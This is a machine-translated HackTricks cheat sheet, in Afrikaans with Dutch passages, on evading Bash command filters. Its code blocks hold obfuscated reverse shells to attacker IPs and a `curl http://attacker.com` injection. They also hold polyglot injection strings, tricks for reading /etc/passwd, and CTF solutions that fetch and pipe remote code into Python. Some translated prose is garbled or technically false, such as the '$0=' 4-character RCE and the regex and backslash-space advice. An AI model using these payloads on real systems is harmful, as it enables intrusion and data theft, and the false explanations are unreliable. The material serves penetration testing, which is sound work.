# Omseil Linux Beperkings

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome** te bou en outomatiseer met behulp van die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Algemene Beperkings Omseilings

### Omgekeerde Skulp
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Kort Rev shell

Hierdie is 'n kort rev shell wat gebruik kan word om 'n verbinding met 'n bediener te maak en beheer oor die doelwitstelsel te verkry.

```bash
bash -i >& /dev/tcp/<bediener_ip>/<poort> 0>&1
```

Vervang `<bediener_ip>` met die IP-adres van die bediener en `<poort>` met die poortnommer waarop die bediener luister.

Hierdie bevel sal 'n interaktiewe bash-sessie skep wat deur die bediener beheer word. Dit stuur die standaard in- en uitvoer na die gespesifiseerde IP-adres en poort.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Deurweeg Paaie en verbode woorde

Om beperkings in Bash te omseil, kan jy verskeie paaie en verbode woorde gebruik. Hier is 'n paar tegnieke wat jy kan gebruik:

#### 1. Gebruik van absolute paaie

In plaas van relatiewe paaie te gebruik, kan jy absolute paaie gebruik om beperkings te omseil. Byvoorbeeld, as die relatiewe pad `/bin/ls` verbode is, kan jy die absolute pad `/usr/bin/ls` gebruik om die `ls`-opdrag uit te voer.

#### 2. Gebruik van omgekeerde skakels

Om beperkings te omseil, kan jy omgekeerde skakels (`\`) gebruik om spesiale karakters te ontsnap. Byvoorbeeld, as die woord `ls` verbode is, kan jy die opdrag `l\ s` gebruik om dit uit te voer.

#### 3. Gebruik van alternatiewe opdragname

As 'n spesifieke opdragnaam verbode is, kan jy 'n alternatiewe opdragnaam gebruik om die beperking te omseil. Byvoorbeeld, as die opdrag `ls` verbode is, kan jy die opdrag `dir` gebruik om dieselfde funksionaliteit te verkry.

#### 4. Gebruik van omgekeerde skakels in opdragname

Om beperkings te omseil, kan jy omgekeerde skakels (`\`) gebruik in die opdragnaam self. Byvoorbeeld, as die opdragnaam `ls` verbode is, kan jy die opdragnaam `l\ s` gebruik om dit uit te voer.

#### 5. Gebruik van omgekeerde skakels in padname

Om beperkings te omseil, kan jy omgekeerde skakels (`\`) gebruik in die padnaam self. Byvoorbeeld, as die pad `/bin/ls` verbode is, kan jy die pad `/b\ in/ls` gebruik om die `ls`-opdrag uit te voer.

#### 6. Gebruik van omgekeerde skakels in argumente

Om beperkings te omseil, kan jy omgekeerde skakels (`\`) gebruik in die argumente van 'n opdrag. Byvoorbeeld, as die argument `file.txt` verbode is, kan jy die argument `file.t\ xt` gebruik om dit te omseil.

#### 7. Gebruik van omgekeerde skakels in omgewingsveranderlikes

Om beperkings te omseil, kan jy omgekeerde skakels (`\`) gebruik in omgewingsveranderlikes. Byvoorbeeld, as die omgewingsveranderlike `PATH` verbode karakters bevat, kan jy omgekeerde skakels gebruik om die karakters te ontsnap.

#### 8. Gebruik van wildcards

Om beperkings te omseil, kan jy wildcards gebruik om opdragte uit te voer. Byvoorbeeld, as die opdrag `ls` verbode is, kan jy die opdrag `l*s` gebruik om dit uit te voer.

#### 9. Gebruik van alternatiewe opdraguitvoerders

As 'n spesifieke opdraguitvoerder verbode is, kan jy 'n alternatiewe opdraguitvoerder gebruik om die beperking te omseil. Byvoorbeeld, as die opdraguitvoerder `/bin/bash` verbode is, kan jy die opdraguitvoerder `/bin/sh` gebruik om dieselfde funksionaliteit te verkry.

#### 10. Gebruik van omgekeerde skakels in opdraguitvoerder

Om beperkings te omseil, kan jy omgekeerde skakels (`\`) gebruik in die opdraguitvoerder self. Byvoorbeeld, as die opdraguitvoerder `/bin/bash` verbode is, kan jy die opdraguitvoerder `/bin/b\ ash` gebruik om dit uit te voer.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypass verbode spasies

Hier is 'n paar tegnieke om verbode spasies in 'n opdrag te omseil:

1. Gebruik enkele aanhalingstekens: As jy enkele aanhalingstekens gebruik, sal die opdrag die spasie ignoreer en die res van die teks as een argument beskou. Byvoorbeeld: `ls' -la` sal die opdrag `ls -la` uitvoer.

2. Gebruik backslashes: Deur 'n backslash voor die spasie te plaas, sal die spasie geïgnoreer word en die opdrag korrek uitgevoer word. Byvoorbeeld: `ls\ -la` sal dieselfde resultaat gee as `ls -la`.

3. Gebruik dubbele aanhalingstekens: Dubbele aanhalingstekens kan gebruik word om die spasie te omhul en dit as een argument te beskou. Byvoorbeeld: `"ls -la"` sal dieselfde resultaat gee as `ls -la`.

Dit is belangrik om te onthou dat hierdie tegnieke slegs werk vir opdragreëls wat deur die Bash-skootrekenaar geïnterpreteer word. Ander skootrekenaars kan verskillende sintaksis vereis.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypass rugsteek en sny

Hier is 'n paar tegnieke om rugsteek en sny beperkings in Linux te omseil:

#### Gebruik enkele aanhalingstekens

As jy enkele aanhalingstekens gebruik in plaas van dubbele aanhalingstekens, sal die rugsteek en sny beperkings omseil word. Byvoorbeeld:

```bash
echo 'Hello World'
```

#### Gebruik die `eval`-opdrag

Die `eval`-opdrag kan gebruik word om die rugsteek en sny beperkings te omseil. Byvoorbeeld:

```bash
eval echo Hello\ World
```

#### Gebruik die `printf`-opdrag

Die `printf`-opdrag kan ook gebruik word om die rugsteek en sny beperkings te omseil. Byvoorbeeld:

```bash
printf "Hello World\n"
```

#### Gebruik die `echo -e`-opdrag

Die `echo -e`-opdrag kan gebruik word om die rugsteek en sny beperkings te omseil. Byvoorbeeld:

```bash
echo -e "Hello\tWorld"
```

#### Gebruik die `echo $'...'`-notasie

Die `echo $'...'`-notasie kan gebruik word om die rugsteek en sny beperkings te omseil. Byvoorbeeld:

```bash
echo $'Hello\tWorld'
```

#### Gebruik die `cat`-opdrag

Die `cat`-opdrag kan gebruik word om die rugsteek en sny beperkings te omseil. Byvoorbeeld:

```bash
cat <<EOF
Hello World
EOF
```

Met hierdie tegnieke kan jy die rugsteek en sny beperkings in Linux omseil en toegang verkry tot beperkte funksies en opdragte.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Om pype te omseil

Om pype te omseil, kan jy die volgende tegnieke gebruik:

#### 1. Gebruik van `sh` in plaas van `bash`

As die beperkings slegs van toepassing is op die `bash`-opdragskulp, kan jy probeer om die `sh`-opdragskulp te gebruik. Jy kan dit doen deur die volgende sintaks te gebruik:

```bash
sh -c 'opdrag'
```

Hierdie benadering kan die beperkings omseil en jou in staat stel om pype te gebruik.

#### 2. Gebruik van `mkfifo`

`mkfifo` is 'n opdrag wat gebruik kan word om 'n benoemde pyp te skep. Jy kan dit gebruik om 'n pyp te skep en dan die data deur die pyp te stuur. Hier is 'n voorbeeld van hoe jy dit kan doen:

```bash
mkfifo mypipe
opdrag1 > mypipe &
opdrag2 < mypipe
```

In hierdie voorbeeld word 'n benoemde pyp met die naam `mypipe` geskep. Die uitvoer van `opdrag1` word na die pyp gestuur met behulp van die `>`-operateur. Die `&`-teken word gebruik om die proses in die agtergrond te plaas. Die `opdrag2` lees dan die data van die pyp met behulp van die `<`-operateur.

Hierdie tegniek kan gebruik word om pype te skep sonder om die beperkings van die opdragskulp te omseil.

#### 3. Gebruik van `socat`

`socat` is 'n nuttige hulpmiddel wat gebruik kan word om data tussen verskillende strome te stuur. Jy kan dit gebruik om pype te skep en data tussen hulle te stuur. Hier is 'n voorbeeld van hoe jy dit kan doen:

```bash
socat -u EXEC:"opdrag1",pty STDIO | opdrag2
```

In hierdie voorbeeld word `socat` gebruik om 'n pyp te skep tussen `opdrag1` en `opdrag2`. Die `-u`-vlag word gebruik om die data onmiddellik te stuur sonder buffering. Die `EXEC`-opdragspesifikasie word gebruik om `opdrag1` uit te voer en die uitvoer daarvan na die pyp te stuur. Die `pty`-vlag word gebruik om 'n virtuele teletipe te skep. Die `STDIO`-vlag word gebruik om die data na die standaard invoer van `opdrag2` te stuur.

Hierdie tegniek maak dit moontlik om pype te gebruik sonder om die beperkings van die opdragskulp te omseil.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Omseil met heksenkodering

Bash-beperkings kan omgespeel word deur gebruik te maak van heksenkodering.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypass IP-adresse

#### IP-adresbeperkings omzeilen

As jy te doen het met 'n stelsel wat IP-adresbeperkings het en jy wil toegang verkry tot die stelsel vanaf 'n ander IP-adres, kan jy die volgende tegnieke gebruik om die beperkings te omseil:

1. **Proxy-dienste**: Maak gebruik van 'n proxy-diens soos Tor of 'n VPN om jou IP-adres te verberg en 'n ander IP-adres te gebruik om toegang te verkry tot die stelsel.

2. **SSH-tunneling**: Maak 'n SSH-tunnel na 'n ander stelsel met 'n toelaatbare IP-adres en gebruik hierdie tunnel om toegang te verkry tot die beperkte stelsel.

3. **Spoofing**: Gebruik IP-spoofing-tegnieke om jou IP-adres te vervals en dit te laat lyk asof jy vanaf 'n toelaatbare IP-adres toegang verkry.

4. **Proxy-chaining**: Maak gebruik van 'n reeks van proxy-diensverskaffers om jou IP-adres te verberg en 'n toelaatbare IP-adres te gebruik om toegang te verkry.

5. **VPN-dienste**: Maak gebruik van 'n VPN-diens wat jou IP-adres verberg en jou 'n ander IP-adres gee om toegang te verkry tot die beperkte stelsel.

Dit is belangrik om te onthou dat die omseiling van IP-adresbeperkings onwettig kan wees en dat jy slegs hierdie tegnieke moet gebruik met toestemming van die eienaar van die stelsel wat jy probeer omseil.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Tyd-gebaseerde data-uitvoer

Om gegevens uit een beperkte omgeving te exfiltreren, kan tijd-gebaseerde data-uitvoer een effectieve techniek zijn. Deze techniek maakt gebruik van de vertragingen in de uitvoering van commando's om gegevens te verzenden.

#### Implementatie

1. Verzamel de gegevens die je wilt exfiltreren en converteer ze naar een geschikt formaat, zoals Base64.
2. Verdeel de gegevens in kleinere delen om de kans op detectie te verkleinen.
3. Gebruik een commando zoals `ping` om de gegevens te verzenden. Pas de vertraging tussen de pings aan om de gegevenssnelheid te regelen.
4. Ontvang de gegevens aan de andere kant en herstel ze naar hun oorspronkelijke formaat.

#### Voorbeeld

```bash
# Verzenden van gegevens
data="SGVsbG8gd29ybGQhCg==" # Base64-gecodeerde gegevens
for i in $(seq 0 2 ${#data}); do
    chunk="${data:$i:2}"
    ping -c 1 -W 1 "$(echo $chunk | base64 -d)"
    sleep 1
done

# Ontvangen van gegevens
tcpdump icmp -i eth0 -vvv
```

In dit voorbeeld worden de gegevens verzonden via ICMP-pakketten met behulp van het `ping`-commando. De gegevens worden in kleine stukjes verdeeld en met een vertraging van 1 seconde tussen de pings verzonden. Aan de ontvangende kant wordt `tcpdump` gebruikt om de ICMP-pakketten te onderscheppen en de gegevens te herstellen.

#### Opmerkingen

- Deze techniek kan effectief zijn, maar het kan ook verdacht gedrag veroorzaken en mogelijk worden gedetecteerd door beveiligingsmaatregelen.
- Zorg ervoor dat je de vertraging tussen de pings aanpast aan de omgeving waarin je werkt om detectie te minimaliseren.
- Houd er rekening mee dat deze techniek mogelijk niet werkt in omgevingen waar ICMP-verkeer wordt geblokkeerd.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Kry karakters vanuit omgewingsveranderlikes

Om karakters vanuit omgewingsveranderlikes te kry, kan jy die volgende opdraggelyne gebruik:

```bash
echo $ENV_VARIABLE_NAME | cut -cX-Y
```

Hier is die betekenis van elke deel van die opdrag:

- `$ENV_VARIABLE_NAME`: Die naam van die omgewingsveranderlike waaruit jy karakters wil kry.
- `X`: Die beginindeks van die karakters wat jy wil kry.
- `Y`: Die eindindeks van die karakters wat jy wil kry.

Byvoorbeeld, as jy die eerste drie karakters van die `PATH` omgewingsveranderlike wil kry, kan jy die volgende opdrag gebruik:

```bash
echo $PATH | cut -c1-3
```

Hierdie opdrag sal die eerste drie karakters van die `PATH` omgewingsveranderlike druk.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS data uitlekking

Jy kan byvoorbeeld **burpcollab** of [**pingb**](http://pingb.in) gebruik.

### Ingeboude funksies

In die geval waar jy nie eksterne funksies kan uitvoer nie en slegs toegang het tot 'n **beperkte stel ingeboude funksies om RCE te verkry**, is daar 'n paar handige truuks om dit te doen. Gewoonlik sal jy **nie al die** ingeboude funksies kan gebruik nie, so jy moet **al jou opsies ken** om die tronk te omseil. Idee van [**devploit**](https://twitter.com/devploit).\
Eerstens, kyk na al die [**shell ingeboude funksies**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Hier is 'n paar **aanbevelings**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Poliglot-opdraginjeksie

Poliglot-opdraginjeksie is 'n tegniek wat gebruik word om opdraginjeksie-aanvalle uit te voer deur 'n enkele opdrag te konstrueer wat deur verskillende interpreteerders in verskillende programmeertale uitgevoer kan word. Hierdie tegniek maak dit moontlik om beperkings te omseil wat deur spesifieke interpreteerders opgelê word.

Die doel van 'n poliglot-opdraginjeksie is om 'n enkele opdrag te konstrueer wat suksesvol uitgevoer kan word deur verskillende interpreteerders, soos die Bash-skripsie-interpreteerder, Python, Perl, PHP, ensovoorts. Hierdie tegniek is nuttig wanneer 'n toepassing beperkings het op die tipe opdragte wat uitgevoer kan word, maar verskillende interpreteerders toelaat om uitgevoer te word.

Om 'n poliglot-opdraginjeksie uit te voer, moet jy 'n opdrag konstrueer wat geldig is in verskillende programmeertale. Dit beteken dat jy die sintaksis en funksionaliteit van elke interpreteerder moet verstaan en gebruik om 'n opdrag te bou wat deur almal verstaan en uitgevoer kan word.

Hier is 'n voorbeeld van 'n poliglot-opdraginjeksie wat gebruik maak van die Bash-skripsie-interpreteerder en Python:

```bash
echo 'Hello, World!' | python -c "import sys; print(sys.stdin.read())"
```

Hierdie opdrag sal die teks "Hello, World!" uitvoer deur dit deur die Python-interpreteerder te stuur en die `print`-funksie te gebruik om dit na die uitvoer te stuur.

Dit is belangrik om te onthou dat poliglot-opdraginjeksie 'n gevorderde tegniek is en dat dit slegs gebruik moet word in etiese hacking-scenarios waar jy toestemming het om die tegniek toe te pas.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypass potensiële regexes

Om potensiële regexes te omseil, kan jy die volgende tegnieke gebruik:

- **Karakterontsnapping**: Voeg 'n backslash (\) voor die spesiale karakters in die regex in. Byvoorbeeld, as die regex `^admin` is, kan jy dit omseil deur `^\admin` te gebruik.
- **Karakterklas**: Gebruik 'n karakterklas ([ ]) om 'n spesifieke reeks karakters te verteenwoordig. Byvoorbeeld, as die regex `^[a-z]` is, kan jy dit omseil deur `^[\a-z]` te gebruik.
- **Karakterbereik**: Gebruik 'n karakterbereik (-) binne 'n karakterklas om 'n reeks opeenvolgende karakters te verteenwoordig. Byvoorbeeld, as die regex `^[a-z]` is, kan jy dit omseil deur `^[\a\-z]` te gebruik.
- **Kwantifiseerders**: Voeg 'n kwantifiseerder (+, *, ?) by die spesiale karakters in die regex in. Byvoorbeeld, as die regex `^admin` is, kan jy dit omseil deur `^admi+n` te gebruik.
- **Ankerpatrone**: Gebruik ankerpatrone (\b, \B) om spesifieke posisies in die teks te verteenwoordig. Byvoorbeeld, as die regex `\badmin\b` is, kan jy dit omseil deur `\badmin\b` te gebruik.

Dit is belangrik om te onthou dat hierdie tegnieke nie altyd sal werk nie, aangesien dit afhang van die spesifieke implementering van die regex-verwerker.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator is a tool used to obfuscate Bash scripts, making them more difficult to understand and analyze. It achieves this by applying various techniques that modify the structure and behavior of the script without changing its functionality.

Some of the techniques used by Bashfuscator include:

- **Variable substitution**: Bashfuscator replaces variable names with randomly generated names, making it harder to understand the purpose of each variable.

- **Code rearrangement**: Bashfuscator rearranges the order of commands and statements in the script, making it more challenging to follow the flow of execution.

- **Control flow modification**: Bashfuscator introduces additional control flow structures, such as nested loops and conditional statements, to confuse the reader and make the script harder to analyze.

- **String manipulation**: Bashfuscator modifies string literals by splitting them into multiple parts or encoding them in different formats, making it more difficult to extract sensitive information.

- **Function obfuscation**: Bashfuscator renames functions and modifies their structure to make it harder to understand their purpose and behavior.

By applying these techniques, Bashfuscator can significantly increase the complexity of a Bash script, making it more resistant to reverse engineering and analysis. However, it's important to note that Bashfuscator is not foolproof and can be bypassed by skilled analysts with enough time and resources.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE met 5 karakters

Hier is een interessante techniek om Remote Code Execution (RCE) te bereiken met slechts 5 karakters. Deze techniek maakt gebruik van een beperking in de Bash-shell.

De beperking is dat wanneer een opdracht wordt uitgevoerd met een variabele die begint met een accolade, de opdracht wordt uitgevoerd zonder dat de rest van de variabele wordt geëvalueerd. Dit betekent dat we een opdracht kunnen uitvoeren zonder dat de rest van de invoer wordt geïnterpreteerd.

Hier is het commando:

```bash
${IFS%?}IFS=\$@;${IFS%?}IFS
```

Dit commando maakt gebruik van de interne variabele IFS (Internal Field Separator) van Bash. We stellen IFS in op de waarde van de opdrachtregelargumenten (\$@) en voeren vervolgens IFS opnieuw uit om de oorspronkelijke waarde te herstellen.

Om deze techniek te gebruiken, moet je een manier vinden om de invoer te injecteren in een omgeving waarin de variabele wordt geëvalueerd. Dit kan bijvoorbeeld gebeuren via een onveilige invoervalidatie in een webtoepassing.

Het is belangrijk op te merken dat deze techniek alleen werkt als de beperking van de Bash-shell aanwezig is. Nieuwere versies van Bash hebben deze beperking opgelost, dus het kan niet op alle systemen werken.

Het is altijd belangrijk om ethisch te handelen en alleen legale en geautoriseerde activiteiten uit te voeren. Het gebruik van deze techniek zonder toestemming kan illegaal zijn en ernstige gevolgen hebben.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE met 4 karakters

Hier is een interessante techniek om Remote Code Execution (RCE) uit te voeren met slechts 4 karakters. Deze techniek maakt gebruik van een beperking in de Bash-shell.

De Bash-shell heeft een ingebouwde variabele genaamd `$0` die de naam van het huidige script bevat. Normaal gesproken kan deze variabele niet worden gewijzigd, maar er is een manier om dit te omzeilen.

Om RCE uit te voeren met slechts 4 karakters, moet je de volgende opdracht uitvoeren:

```bash
$0='bash -c "command"'
```

Vervang `'command'` door de opdracht die je wilt uitvoeren. Bijvoorbeeld:

```bash
$0='bash -c "echo Hello, world!"'
```

Dit zal de opgegeven opdracht uitvoeren als een subshell van de huidige shell. Hierdoor kun je opdrachten uitvoeren met slechts 4 karakters.

Houd er rekening mee dat deze techniek alleen werkt als de Bash-shell beschikbaar is en de variabele `$0` kan worden gewijzigd. Het kan handig zijn tijdens pentesten en het omzeilen van beperkingen, maar wees voorzichtig bij het gebruik ervan.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Lees-Alleen/Geen Uitvoering/Beperkte Bash-Omzeiling

As jy binne 'n lêersisteem met die **lees-alleen en geen-uitvoer beskerming** of selfs in 'n distrolose houer is, is daar steeds maniere om **arbitrêre bineêre lêers uit te voer, selfs 'n skul!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot & ander Jails-Omseiling

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Verwysings & Meer

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en outomaties werkstrome te bou wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
